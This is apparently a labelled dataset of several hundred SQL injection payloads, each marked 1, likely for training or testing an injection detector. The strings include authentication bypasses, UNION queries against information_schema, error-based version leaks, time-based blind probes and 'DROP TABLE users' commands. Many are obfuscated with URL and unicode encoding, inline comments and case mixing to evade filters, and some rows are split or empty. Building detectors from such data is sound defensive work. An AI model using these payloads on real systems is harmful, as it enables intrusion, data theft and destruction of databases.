"t%65st'%09%09%09%09%09OR%09%09%09%09%09'1'IN%09%09%09%09%09(1)%27%31'%09%09%09%09%09/%2a--fxjuflgzsa9zt", 1
"%u0027%u0020%4fR%u0020%u00271%u0027%3d%u00271#m2cl5z", 1
"'OR/*%0d%0a*/EXISTS(SELECT1%0aFROM/*%0a*/users)--", 1
"' || EXISTS(SELECT 1 FROM users) # more_noise--", 1
"1'%20%20%%320UNI%4fN%20%20%20SELECT%20%20%20table_nam%65,%20%20%%320null,%%320%%320%20nu%6cl%20%20%20FROM%%320%20%20info%72mation_schema.tables%%320%20%20--%23l%78ch8", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20%20#%20more_noise--", 1
"AdmIn' or '1'='1", 1
"1'UNIONSELECT%0d%0atable_name,null,nullFROMinformation_schema.tables--", 1
"' OR 1=1 -%2D%20 OR (1)", 1
"test%27/*!*/OR '1'>='%31' /* AND 'a'='a'", 1
"1)%20UNION%20SELECT%201,database(),3%20--%20random_noise--", 1
"%u0027%u0020A/*!12345*/ND%u00201%3Dconvert(int,@@version)--", 1
"1' OR IF(su%62string(da%74abase(), 1, 1)%3d'a', SLEE%50(5), 0%29%20--", 1
";/*!12345*/DROP%u0020TABLE%u0020users;%u0020--", 1
"%27%20OR%201%3D1%20 # more_noise--%20", 1
"'%20OR 1=1 %2d-", 1
"1'/**//**//**//**/AND/**//**//**//**/substring(database(),/**//**//**//**/1,/**//**//**//**/1)/**//**//**//**/%20IN/**/(1)%09/**//**//**//**/'s'/**//**//**//**/--", 1
"1/*!*/XOR 1=1", 1
"%u0027%u0020XOR%u0020extractvalue(1,concat(0x5c,version()))--", 1
"1 AND 1=1--veturlbexc3", 1
";/**/SeleCTpG_sLEep(5);%0aOr/*%0d%0a*/(1)--%0a", 1
"test'/**/OR/**/'1'>='1'/**//*#2a9zuhb", 1
";/*!*/dROPtAble%0ausERS;%0a--/*%0a*/", 1
"test%27O%52/*%%30d%0a*/%271'='1'/*/*%0a*/", 1
"1%%320AND%201%3D%31 AND 'a'='a'#jn6gabd", 1
"1%29%29%20UNI%254fN%20SELECT%201%2Cd%2561ta%2562%2561se%28%29%2C3--", 1
"%u0027%u0020&&%u0020extractvalue(1,concat(0x5c,version())) -- random_noise--", 1
"%u0027%u0020OR%u0020%u00271%u0027	=%09%u00271--zmiug4f", 1
"'OR/*%0d%0a*/'1'='1%0d%0a", 1
"'/*!12345*/UNIOn sELeCT NULl, null, nULL --", 1
"WAITFOR%20DEL%41Y%20%27%30%3A0%%33A5%27--", 1
"adMIN' || '1'='1 xOR 'A'='A'--KW5F3l1qT", 1
"' AND extractvalue(1,concat(0x5c,version()))----k48fro4w9oz6z90", 1
"'%20%20AND%20%201%20=  1%20%20 # more_noise--%20%20#rspb75k0cq", 1
"%27%20&&%20%31%%33Dcon%76ert(%69nt,@@version)--", 1
";/*!*/D%52O%50/**/TABLE%20users;/**/----d2jmw3qdjtd", 1
"'%09OR%09EXISTS(SELECT%091%09FROM%09users)--#1c5zrqqo", 1
";DROP%0ataBlEuSErS;%0a--%0d%0a", 1
";DrOP/*%0d%0a*/TAbleUsErs;/*%0d%0a*/--/*%0d%0a*/", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise----bw02x0", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#9t0w88je", 1
"%27A/*!12345*/ND%0d%0a1%3Dconvert(int,@@version)--", 1
"'  UNION  SELECT  1,2,3--", 1
";/**//**/DROP/**//**/TABLE/**//**/users;/**//**/----7uwab8fy2ac6l0", 1
"1%20A/*!12345*/ND%201%3D1#e8eeb32wc6o40rh", 1
"%27%20%20AND%20%2%301%0%39%3D%25201%20%2%30--%2%30%20", 1
"1'/*!12345*/uNiON/**/selECt/**/taBlE_NAME,/**/NULL,/**/NUlL/**/FROm/**/InformATiOn_SCHema.TabLeS/**/----37DIt3", 1
"1) uNioN SELect 1,dATABaSE(),3--", 1
"' || EXIStS(sElECt 1 FrOm useRS)--", 1
"%27%20%2%30%20%20%20and%20%%320%20%20%201	%3D%%320%31%%320%20%20%20%20-%2d%20%20%20%20%20", 1
"1'andSUBSTring(dAtabASE(),1,1)/*%0a*/LIKe%0d%0a'S'%0aOR(1)--", 1
"%27/*!*/OR%20EXISTS(SELECT%201%20FROM%20users)%20OR%20(1)----w7xqidmw", 1
"1'UNION/*%0a*/SELECTtable_name,null,nullFROMinformation_schema.tables OR 'b'='b'--#obp0getkvse", 1
"' OR '1%27%3d'1", 1
"' AND 1>=1 --", 1
"WAITFORDELAY/*%0d%0a*/%270:0:5%27----p84g4lv696t0zhv", 1
";/*!12345*/SeLect PG_sLEeP(5); --", 1
"1'%20%20AND%20%20%73u%62stri%6eg(datab%61se(),%20%201%2c%20%201)%20%20/**/=%09%20%20's'%20%20--", 1
"%3B%2F%%32A%2A%2FSELEC%54%20pg%5fsleep%2%385%29%3B%20--", 1
"%u0027%u0020AND%u00201	=%201%u0020AND/*%0d%0a*/'a'='a'--%u0020", 1
"", 1
"1' OR ascii(sub%73t%72ing%28database(%29, 1, 1)) %3e 100%20----5lyq31byt%30", 1
"1'	UNION	SELECT	table_name,	null,	null	FROM	information_schema.tables	--", 1
"1)/**/unIoN/**/SeLeCT/**/1,DaTAbAse(),3--", 1
"%u0027%u0020O/**/R%u00201%3D1%u0020--%u0020", 1
"%27%20UnION%20select%201%2c2%2c3--", 1
"'OR1<=1%0d%0a--", 1
"1))UNION%0d%0aSELECT%0d%0a1,database(),3--/*%0d%0a*/#o91co7hgqf49jlp", 1
"tes%2574%25u0027%25u0020%254fR%25u00%25320%25u00271%25u0027%3D%25u0%2530271%25u0027%25u0020--%25%257500%25320", 1
"' AND 1=1 -- --1df2z9ma", 1
"'orExISTs(seLeCT1fRom%0aUSERS)--#3PpvSl", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null%2c%20%6eull%u0020%46ROM%u0020informati%6fn_schema.tables%20--%2d-rt%7apnhh%37n", 1
"1%29%29%25u0020UN/**/ION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3--", 1
"1)) UNION SELECT 1,database(),3--#9nycx", 1
"%27%20%2541Nd%201%3D1%20%252D-%20--CYovE", 1
"1/*!12345*/aND 1=1", 1
";%20SEL/*!12345*/ECT%20pg_sleep(5);%20%20#%20more_noise--#7sr7f5q", 1
"test'/*!12345*/OR '1'='1'  # more_noise--", 1
"%27/**/oR/**/EXisTs(SeLeCt/**/1/**/frOm/**/usErS)--", 1
"%27%20OR%20%271%27%3C%09%3D%20%271%20AND%20%27a%27%09%3D%20%27a%27", 1
"1)%20UNiOn%20seleCT%201,daTaBasE(),3--", 1
"t%65st%u0027%u0020%4fR%u002%30%u002%371%u002%37=%%750%30271%u0027%u0020/*%u%30020/*!*/AND%u00201=1", 1
"%u0027%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u00201	=%091%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020", 1
"1)%%750020UNIO%4e%u00%320SELECT%u00201,%64atabase(),3-%2d", 1
"1 And 1<=1", 1
"'%20%4fR '1'='1", 1
"%27/*!12345*/A%4eD/*%2a/ext%72actvalue(1,concat(0x5c,%76ersion())%29-%2d", 1
"' ANd 1=1 -- #92jXTo93d1Ab", 1
"1))%20%20UNION%20%20SELECT%20%201,database(),3 # more_noise--", 1
"' UNION SELECT null, null, null  OR (1)--", 1
"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020/*--a3g7uln5", 1
"'OR", 1
"'1'='1%0d%0a", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----9qnufx2p4ty8", 1
"' OR%20EXISTS(SELECT 1%20%46%52OM users) OR (1)--", 1
"%%327%20UNIO%4e%20SELECT%20null,%%320null,%%320null%20%2d-%20", 1
"1)%20%20%20%20%20%20%20%20UNION%20%20%20%20%20%20%20%20SELECT%20%20%20%20%20%20%20%201,database(),3--", 1
"WAITFORDELAY/*%0a*/'0:0:5'--%0a--4lya7o7tnfq8", 1
"1) UNION SELECT 1,database(),3----t3jb62odq1njef9", 1
"1' && substring(database(), 1, 1) = 's' --#lkao7b8l4ifu", 1
"%27%20UN%49ON%20SELECT%20null%2c%20null,%20nu%6cl%20%2d-%2%30", 1
"1%27UNIONSELECTtable_name,null,null/*%0a*/FROMinformation_schema.tables--", 1
"%2527%2520OR%2520%25271%2527%253D%25271%23gedksn0dz", 1
"'AND", 1
"1>=1--/*%0d%0a*/", 1
"'ANDextractvalue(1,concat(0x5c,version()))--%0a", 1
"test%27%2509%2509%2509%2509%2509O%2F%2A%2A%2FR%2509%2509%2509%2509%2509%271%27%09%3D%2520%271%27%2509%2509%2509%2509%2509--%2509%2509%2509%2509%2509", 1
"1%20AND%%3201%3D%31", 1
"1%u0027/**/OR/**/If(sUBsTriNg(DatAbaSE(),/**/1,/**/1)=%U0027a%u0027,/**/slEep(5),/**/0)/**/--", 1
"WAITFOR%09%09%09DELAY%09%09%09'0:0:5' AND 'a'='a'--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020%u0020--%u0020random_noise--#s2t1ye", 1
"'/**/UniON/**/seLEct/**/1,2,3--", 1
"1 XOR 1=1 # more_noise#uoigzta1hei6n", 1
"1' XOR substring(database(), 1, 1) = 's' --#p6mn2nfj9", 1
"%27%2520AND%201%3Dc%256fnvert%28int%2C%40%40%2576e%2572sion%29--", 1
"' || 1%3d1%20-- #xotq10zjhf", 1
"1)/*!12345*/UNION%u0020SELECT%u00201,database(),3--", 1
";%20SELECT%20pg_sleep(5);%20--#4ibr9lmqoj7z6", 1
"1%20aND%201%3d1 OR (1)", 1
"%27OR'1%27='1/*%0d%0a*/ /*!*/AND 1=1", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#b5wj78u6u", 1
"test'				OR%09%09		'1'%09=%20'1'				%2d-			%09 AND 'a'='a'", 1
"1' or If(subSTriNG(D%61T%61basE(), %31, 1)='%61', s%4ceeP(5), %30) --", 1
"WAITFOR/**//**//**//**/DELAY/**//**//**//**/'0:0:5'--", 1
"a%64min%27 OR '1'='1", 1
"'/**/OR/**/1%09=  1/**/--/**/", 1
"1'ANDsubstring(databa%73e()%2c/*%0a*/%31,%201)IN (1)'s%27%2d---lifq8nb", 1
"WaITFOR/**/deLAY/**/'0:0:5'--", 1
"'/**/OR/**/'1'<='1/**/--/**/random_noise", 1
"'%20OR/*!*/1=1 --%20", 1
";/*!12345*/DROP TABLE users;  -- random_noise--#lmpxl6s7", 1
"1%u0027%u0020oR%u0020If(sUbsTRiNg(dATAbaSE(),%u00201,%u00201)>=%u0027A%u0027,%u0020sleEp(5),%u00200)%u0020--", 1
"t%65%73t' || (1=1)%271'='1' --", 1
"1'ORIF(substring(database(),/*%0d%0a*/1,1)='a',SLEEP(5),", 1
"0)--", 1
"'			AND			1IN			(1)1			--", 1
"test' OR '1'='1' -- --8e07bmavf2", 1
"1)/*!12345*/UNION/**/SELECT/**/1,database(),3----lpw133dld2", 1
"; DROP TABLE users; --#yk9wf21d5m", 1
"'/**/UNIONSELECT/*%0d%0a*/1,2,3--%0d%0a", 1
"1%u0027%u0020%41ND%u0020substring(databa%73e(),%u00201,%u0%30%3201%29%%750020=%%750%3020%u0027s%u0027%u00%320--", 1
";  SELECT  %70g%5fsleep(5);  %2d-", 1
"%27 uNIoN select nul%6c%2c NuLl, NULl%20-- #fZKJs", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/ /*!*/AND 1=1--", 1
"'		aND		ExtRactValue(1,ConCAT(0X5c,vERSIoN()))----tfi4tcezvsi", 1
"waItFO/**/R%20deLaY%20%270%3a0%3A5%27%20aND%20%27A%27%3d%27a%27--", 1
"1)/**/union/**/sEleCt/**/1,dATAbAse(),3----U197ZT4AVi", 1
"'%09%09%09%09aNd%09%09%09%091%09=%091%09%09%09%09--%09%09%09%09", 1
";SELECT%0d%0apg_sleep(5);%0aOR/*%0a*/%u0027b%u0027=%u0027b%u0027--#vbah6kmdx08", 1
"Admin' or '1'='1", 1
"1'		OR		ascii(substring(database(),		1,		1))		>		100		----w5adgjoew", 1
"1' Or ASCiI(SUBstRiNg(DATaBASE(), 1, 1)) > 100 --", 1
"1'OR", 1
"IF(substring(database(),1,1)<='a',/*%0a*/SLEEP(5),0)----8kikk2h", 1
";%u0020%53E%4cECT%20pg_sleep(5);%u0020--", 1
"1'UNIONSELECTtable_name,/*%0d%0a*/null,nullFROMinformation_schema.tables /*!*/AND 1=1----ps34xzrdwuagdc", 1
"' OR 1>=1%20 # more_noise-- -%2d%337k%6e448q", 1
"tEst' or '1'='1' /*", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271#wxiifv", 1
"'AND", 1
"1=CONvERT(INt%2c@@v%65rS%69on%29--", 1
"", 1
";SEL%45CT%0d%0apg_sl%65ep(5);-%2d", 1
"1'ORascii(substring(database(),1,1))/*%0d%0a*/>100----f1prku3", 1
"TesT%u0027%u0020oR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020--yxrq6x", 1
"' AND extractvalue(1,concat(0x5c,version())) /*!*/AND 1<=1----pqo4jgvqgobxd0", 1
";/*!12345*/SELECT%20pg_sleep(5);%20 OR (1)--", 1
"admiN%27%2F**/o%52/**/%271%27%3d%271", 1
"1'U%4eIO%4e/*%0d%0a*/SELECTtable_%6eame,null%2cnullFROMinformation_sc%68em%61.tables%2d-ran%64om%5fnoise--", 1
"", 1
";%20DROP%20TABLE%20users;%20--#kd4im3y", 1
"1%u0027%u0020%u0020%u0020%u0020%u0020%u0020XOR%u0020%u0020%u0020%u0020%u0020%u0020ascii(substring(database(),%u0020%u0020%u0020%u0020%u0020%u00201,%u0020%u0020%u0020%u0020%u0020%u00201))%u0020%u0020%u0020%u0020%u0020%u0020>%u0020%u0020%u0020%u0020%u0020%u0020100%u0020%u0020%u0020%u0020%u0020%u0020--", 1
"1%27%20oR%%320ASCii%28SUBStrINg%2%38DAt%41BasE%28%29%2c%20%31%2%43%201%29%29%20%3e%20%3100%20-%2d", 1
"'%09%09%09%09OR%09%09%09%09'1'  =  '1#a%77%74%7amxslw", 1
"%27%20AND%201%3D%63on%76ert%%328int%2C%%340%40versi%6fn%29%20#%20more_noise--", 1
"test' OR '1'='1' /*#472je1pnmcm4ul", 1
"test%27/*!12345*/OR%20%271%27%3D%271%27%20/*", 1
"' OR EXISTS(SELECT 1 FROM users)--#fbogth263ck9kq9", 1
"%u0027%u0020oR%u0020ExiSTs(seLeCT%u00201%u0020FROM%u0020uSERs)--", 1
"%3B%%320%20%20%%320%20%20SELECT%20%20%20%20%2%30%20pg_sl%65ep%285%29%3B%%320%%320%20%%320%20%20--", 1
"%u0027%u0020AND%u00201LIKE1%u0020--%u0020#hq80j9vm3vxjk50", 1
"'/*!*/UNION SELECT null, null, null -- --6073wiq4tj21", 1
"1%u0020AND%u00201=1 OR (1)", 1
"1'/**/UNION/**/seLecT/**/taBle_naMe,/**/nuLL,/**/null/**/From/**/INfoRMAtiOn_sCHEMa.TABles/**/----TR8w6pT383", 1
"'					OR					1/**/ =%091										OR					'b'  =%09'b'--					#vju3pe", 1
"TESt%27%20||%20(1%3d1)%271%27%3D%271%27%20--%20", 1
"%27%2509%2509%2509%2509AND%2509%2509%2509%25091%09%3D%25091%2509%2509%2509%2509--%2509%2509%2509%2509", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3 # more_noise--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20#pspvqxf", 1
"1%29UNION%2F%2A%250a%2A%2FSELECT%250d%250a1%2Cdatabase%28%29%2C3--%250d%250a", 1
"' OR 1=1  OR (1)-- --mlw3mzla17oi7e", 1
"a%64min' OR %271'<='1", 1
"ADMiN'     Or     '1' =%20'1", 1
"%27%20UnIoN%20seL%45ct%%3201,2,3----uf42wj%32rw%36", 1
"1%u0020anD%u00201=1%U0020#%U0020mORE_NOISe", 1
"; DroP TaBLE UsERS;  -- random_noise--", 1
"test'OR/*%0d%0a*/'1'='1'%0a--/*%0d%0a*/", 1
"'OR/*%0d%0a*/'1'='1 -- random_noise", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version())) OR (1)----ksq92wnq05", 1
"%3B%2F%2A%2A%2FSEL/**/ECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2F--", 1
"'%20AND/**/1LIKE1/**/-%2d/**/", 1
"1'%09%09%09%09%09AND%09%09%0%39%09%%309substring(%64atabas%65(),%09%0%39%%309%09%%3091,%09%09%09%09%091)%09%%309%0%39%09%09%09=	%09%09%0%39%09%0%39's'%09%09%09%09%09--", 1
"a%64%6din' OR '1'='1 OR 'b'='b'", 1
"'/**/AND/**/1>=1/**/--/**/--2uicbeq7qq", 1
"1%u0027%u0020XOR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"1'/*!12345*/XOR AsCII(SUBstrInG(DAtaBaSe(), 1, 1)) > 100 --", 1
"1)UNIONSELECT/*%0d%0a*/1,database(),3----u55u4q3nz8zii2q", 1
"%u0027UNIONSELECTnull,null,null--/*%0a*/#5hlhmtp3ajrfy", 1
"1/*!*/AnD 1=1", 1
"' ANd 1=ConveRt(inT,@@VerSion)--#r42fbp", 1
";/**/SELECT pg_sleep(5);  # more_noise--", 1
"%27AND%250a1%3Dconvert%28int%2C%40%40version%29--", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3C%3D%271%233u49js", 1
"%u0027%u0020anD%u00201>=1%u0020--%u0020", 1
"1)) UNION SELECT 1,database(),3----1dw2ocsogbp0m", 1
"'OR'1'='1/*%0d%0a*/OR'b'='b'", 1
"%27%55NIONSELECT/*%0%64%0a*/1,2,3 # more_noise--", 1
"test%27OR/*%0a*/%271%27%3D%271%27", 1
"/*%0a", 1
"' AND%20%31=1 --", 1
"' AND 1LIKEconvert(int,@@version)--#2ayhoa63bambv", 1
"1'%20ORI%46%28substring(datab%61se(),1,1%29='a',SLE%45P(5),0)/*%0d%0a*//*!*/AND1=1--/*%0a*/", 1
"1'/**/||/**/(1=1)AScii(SubsTRiNG(DATABAse(),/**/1,/**/1))/**/>/**/100/**/--", 1
"admin%27%20OR%20%271%27%3D%271%23yk7we3lgmrfn", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----2ze9wkkppvxrggu", 1
"%27%2F%2A%2A%2FUNIOn%2F%2A%2A%2FSELeCT%2F%2A%2A%2F1%2C2%2C3--", 1
"'/**/OR%2f**/1=1/%2a*/ # more_noise%2d-%2f**/", 1
"%27%20OR%201%3D1%20--%20#95cxk6uy", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#90lo75475knej", 1
"WAITFO/*!*/R/**/DELAY/**/'0:0:5'--", 1
"1 aNd 1=1--nmo4penjk", 1
"1%27%20UnioN%20SelECT%20Table_namE,%20nuLL,%20nULl%20FRoM%20iNfOrMATIoN_scHeMa.taBLES%20--", 1
"1) uNioN SeLect 1,DATabAse(),3--", 1
"%27%20%20%20OR%20%20%20EXISTS%28SELECT%20%20%201%20%20%20FROM%20%20%20users%29--", 1
"'UNIONSELECTnull,null,null--%0a", 1
"test'/*!12345*/OR'1'='1'/*/*%0d%0a*/#more_noise", 1
"1)) UN%49ON SE%4cE%43T %31,database(),3--", 1
"test%27%20OR%20%271%27%3D%271%27%20 # more_noise--%20", 1
"'/**/Or/%2A*%2FE%58%49sTS(sELEct/**/1/**%2FfRoM/**/UsERS)--", 1
"ADmIn'/**/Or/**/'1'='1", 1
"1%20%20%20AND%20%20%201/**/=/**//**/1", 1
"'AND%0a1%09=convert(int,@@version)----0j513m9w7f51i/*%0a*/", 1
";SELECTpg_sleep(5);/*%0d%0a*/--", 1
"%u0027%u0020||%u0020%u00271%27>=%u0027%31", 1
"'/**/A/**/ND/**/1=convert(int,@@version)----a6u4ssj", 1
"'	AND	1  =	convert(int,@@version)--", 1
"1))%20UNION%20SELECT%201,database(),3 OR (1)--", 1
"WAITFO/*!*/R%u0020DELAY%u0020%u00270:0:5%u0027--", 1
"wAiTFor%25u0020deLaY%25U0020%25U00270%3A0%3A5%25u0027--", 1
"1'				anD				suBSTRInG(database(),				1,				1)				> =					's'								oR				'b' =	'b'--", 1
"%2527%2520UNION%2520SELECT%25201%2C2%2C3%2520%23%2520more_noise--", 1
"WAITFORDELAY%270:0:5%27--%0d%0a", 1
"1)/**/UNION/**/SELECT/**/1,database(),3 OR (1)--", 1
"test' xor '1'='1'  /*!*/aND 1=1--", 1
"'/**/AND extractvalue(1,concat(0x5c,version()))----zry58dgv", 1
"%27/**/AND%201%3D1%20--%20", 1
"TeSt'/**/OR/**/'1'='1'/**/--/**/", 1
"%27%2%30OR%201%3D1%20--%2%30", 1
"test' XOR '1'='1' /*--zx47sy", 1
"1%27%20%26%26%20SUBStRIng%28dATaBAse%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"'/*!*/UNION SELECT null, null, null  OR 'b'='b'-- --aall8maceeps", 1
"WAITFO%52%u0020DELAY%u0020%270:%30:5%u0027--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020||", 1
"(1)--", 1
"; dr%4fP tAB%6c%45 UsErs; -%2d#egoee0vvx", 1
";	SELEcT	pG_sleep(5);	--#F4CdJxDiJ7r0se", 1
"' AND 1=1 -- #jqkywp0tww", 1
"%27%20%26%26%201%3D1%20--%20", 1
"1%25u0027%25u0020uNion%25U0020sELEct%25u0020TAble_NAMe%2C%25u0020NULL%2c%25u0020NULl%25U0020FroM%25U0020inForMaTiOn_scHEMA.TablES%25U0020--", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20----40aix", 1
"1/**/AND/**/1%3D1--ajtjinoc7rptoc8", 1
"1)) UNION SELECT 1,database(),3--#axrbc3", 1
"'/*!*/XOR extractva%6cue(1,con%63at(0x5c%2c%76ersi%6fn()))--", 1
"1'/%2a*/OR/**/ascii(sub%73tring%28database(),/%2a%2a/1,/**/1))/%2a*/>/**/100/*%2a%2f--", 1
"1%29%29%25u0020UN%2F%2A%21%2A%2FION%25u0020SELECT%25u00201%2Cdatabase%28%29%2C3--", 1
"' UNION SELECT null, null, null -- --i6ctd55f5", 1
"1 AND 1=1%20OR '%62'='%62'#bougaced", 1
"'AN%44/*%0d%0a*/1>=con%76ert(int,@%40version)--%2f*%0a%2a/", 1
"%27/**/O/**/R/**/1%3D1/**/--/**/", 1
"1'ORascii(substring(database(),1,/*%0a*/1))%0d%0a>100--%0a", 1
"1/**/&&/**/1=1--pjkf4s", 1
"'%20%20%20%20%20OR%20%20%20%20%201%09=	1%20%20%20%20%20--%20%20%20%20%20", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020#g1d4rczy", 1
"1%27/**/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20----yjdwfcjxapd", 1
"' A%4eD extractvalue(%31,concat(0%785c,vers%69o%6e()))--", 1
"'				UN/*!*/ION				SELECT				1,2,3--", 1
"1' AND substring(database(), 1, 1) = 's' ----c3ahb9bpqjmf", 1
"1)/*!12345*/UnION sELect 1,dAtaBASe(),3----13A1a", 1
"1aNd%0A1=1%0a", 1
"waItFOr%u0020deLAY%u0020%u00270:0:5%u0027%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"'%20%20%20AND%20%20%201  =%091%20%20%20--%20%20%20", 1
"1))%09%09uNiON%09%09sELECt%09%091,dAtAbasE(),3--", 1
"%31%27%u0020UNION%u0020SELECT%u0020ta%62le_nam%65,%u0020null,%u0020null%u0020FROM%u0020information%5fsch%65m%61%2etables%u0020--", 1
"AdMin%u0027%u0020Or%u0020%U00271%U0027=%U00271", 1
"adMIn' OR '1'in (1)'1", 1
"%27%20AND%%3201%3D1%2%30--%20", 1
"tesT%27%20or%20%271%27%3d%271%27%20--%20--e0x2ariplq", 1
"admin' OR '1'>='1#z37dxu", 1
"' unioN seLEct nULl, NUll, NuLL --", 1
"'%09%09%09%09OR%09%09%09%09'1'/**//**/=/**/'1#bsfwzlty6", 1
"teSt%u0027%u0020or%u0020%u00271%u0027>=%u00271%u0027%u0020/*%u0020--%u0020random_noise", 1
";SELECTpg_sleep(5);%0a/*!*/AND1=1----xckziln52gu02qq", 1
"%u0027%U0020UNIon%u0020SElECT%U00201,2,3--", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/ OR 'b'='b'--", 1
"test'  OR  '1'%09=%09'1'  /*", 1
"1'UNIONSELECT%0atable_name,null,null%0d%0aFROM%0ainformation_schema.tables--", 1
"1'UNION/*%0a*/SELECTtable_name,%0anull,nullFROM", 1
"information_schema.tables AND 'a'='a'--", 1
"admin'%20OR %271'='1", 1
";%09%09%09%09SELECT%09%09%09%09pg_sleep(5);%09%09%09%09#/*%0d%0a*/more_noise--#em7jhcg%0a", 1
"admin%27%20OR%20%271%27%3C%3D%271%20%2F%2A%21%2A%2FAND%201%3D1--2qer5j9u5", 1
";DROP%0aTABLE/*%0d%0a*/users;", 1
"--", 1
"WAITFO%52/*!12345*/DELAY '0:0:5%27%2d-", 1
"'%20UNION SELEC%54 1,%32,3--", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**//**/OR/**/'b'='b'--", 1
"%%327%20OR%20%271%27%3D%%3271", 1
"admin%u0%3027%u%30020OR%u%30020%u00271%u0027=%u%30027%31", 1
"1%29%29%20UNIoN%20selEct%201%2CdAtaBASe%28%29%2c3--", 1
"1))%20UnioN%20SELECT%201,datABase(),3--", 1
"%27%%320O%52%20%271%27%3D%271", 1
"1%u0027%u0020OR%u0020IF%28substring(database(),%201,%u00201)=%u0027%61%u0027,%u0020S%4cEEP(5),%u00200%29%u0020%2d-", 1
"1%27/*%2a/O%52/**/asci%69(su%62st%72ing(databa%73e(),/**/1,/**/1))/**/%3E/**%2f100/**%2f--", 1
"%74est%u0027%u0020OR%u0020%u00271%27=%u00271%u0027%u0020%2d-%u0020", 1
"%31))%55N%49O%4e/*%0d%0a*/SEL%45CT/*%0d%0a*/1,database(),3--/*%%30a*/", 1
"1)%u0020UniOn%u0020SeLecT%u00201,DAtABasE(),3--#nfkexicvmrm7", 1
"1))/**/U%4eION/**/SELEC%54/**/1%2cdatabas%65(%29,3--", 1
"'/**/AND extractvalue(1,concat(0x5c,version()))--#x295vxztuob3pns", 1
"'AND/*%0d%0a*/1=convert(int,@@version)--/*%0a*/", 1
"test'/*!12345*/OR   '1'	=%09'%31'%20/*#0%361qu%70", 1
"%27%2F%2A%2A%2FAND%20%20%20%201%2520%3D%20convert%28int%2C%40%40version%29--", 1
"1'ORascii(substring(database(),/*%0a*/1,/*%0d%0a*/1))>100AND'a'='a'--%0d%0a--vqnumxjw3jyo", 1
"1'%20%20%20AND%20%20%20substring(database(),%20%20%201,%20%20%201)%20%20%20%09=%09%20%20%20's'%20%20%20%20%20%20AND%20%20%20'a'%09=%09'a'--", 1
"TEst%27%20or%20%271%27%3D%271%27%20%2F%2A", 1
"%u0027/*!12345*/AND%u00201  =  1%u0020--%u0020", 1
"1'UNIONSELECT%0d%0atable_name,/*%0d%0a*/null,", 1
"nullFROMinformation_schema.tables OR (1)--", 1
"'ANDextractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"1))UNION/*%0a*/%53ELE%43T%0d%0a1,d%61tab%61se(),3-%2d", 1
"1%29%29UNION%0ASELECT%250a1%2Cdatabase%28%29%2C3--%250a", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version())) OR 'b'='b'----o6i8cnbe4c", 1
"wAitfor deLay '0:0:5'--", 1
"' AnD EXtraCTValue(1,CoNcAt(0X5c,veRSIoN()))--", 1
"' XOR 1LIKE%31 -%2d", 1
"'/**/||/**/exiStS(SEleCT/**/1/**/from/**/USers)--", 1
"1'/*!12345*/ORIF(substring(database(),1,1)='a',SLEEP(5),0)", 1
"OR'b'='b'--", 1
"%74est'/**/%4f%52/**%2f'1'='1'/**/--/**/", 1
"%27OR1%3D1--%2F%2A%250a%2A%2F", 1
"1 %41ND 1=1#mwnpfg4ybzd4u71", 1
"%u0027%u0020or%u0020%u00271%u0027=%u00271", 1
"WAITFORDELAY%250a%270%3A0%3A5%27--%2F%2A%250d%250a%2A%2F", 1
"admi%6e'/*%2a/OR/**/%271' =	'1", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29 AND 'a'='a'--#fh6hih", 1
"%27%09%09%09%09%09OR%09%09%09%09%091%20%20%3D%25091%09%09%09%09%09--%09%09%09%09%09", 1
"' UNIOn selEcT 1,2,3--", 1
"test'OR%271'=%271'-%2d/*%0d%0a*/", 1
"AD%6Din' Or '1'%3d'1#FJ616tuDCn0M", 1
"%27%20AND%201%3E%3D1%20--%20", 1
"test%27%2520%254fR%20%271%27%3D%25271%27%20%20%2F%2A%21%2A%2FAND%201%3D%2531--%20", 1
";SEL/*!*/ECT%0apg_sleep(5);--", 1
"1%27%20O/**/R%20ascii(substring(database(),%201,%201))%20%3E%20100%20----039uy1llo1", 1
"%27%20UN/*!*%2fION%%32%30SE%4cECT%201%2C2%2C3--", 1
"1) %55nion S%65lect 1,datA%62asE(),3-%2d", 1
"%27%20UNION%20SELECT%201%2C2%2C3--#9oirbrp", 1
"TEst%27%20Or%20%271%27%3d%271%27%20--%20", 1
"test'/**/OR '1'%3d'1%27 %2f*", 1
